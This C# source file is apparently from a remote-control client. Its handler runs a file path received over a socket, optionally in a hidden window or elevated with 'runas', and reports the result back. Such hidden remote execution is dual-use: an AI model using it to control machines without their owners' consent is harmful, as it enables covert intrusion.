using System;
using System.Diagnostics;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestRunFileHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestRunFile;
                    if (req == null) return;

                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = req.FilePath;

                    switch (req.Mode)
                    {
                        case eRunFileMode.Show:
                            psi.WindowStyle = ProcessWindowStyle.Normal;
                            break;
                        case eRunFileMode.Hide:
                            psi.WindowStyle = ProcessWindowStyle.Hidden;
                            psi.CreateNoWindow = true;
                            break;
                        case eRunFileMode.Elevate:
                            psi.Verb = "runas";
                            break;
                    }

                    Process.Start(psi);

                    var resp = new ResponseRunFile();
                    resp.Result = true;
                    resp.Message = "执行成功";
                    session.Send(ePacketType.PACKET_RUN_FILE_RESPONSE, resp);
                }
                catch (Exception ex)
                {
                    var resp = new ResponseRunFile();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_RUN_FILE_RESPONSE, resp);
                }
            });
        }
    }
}
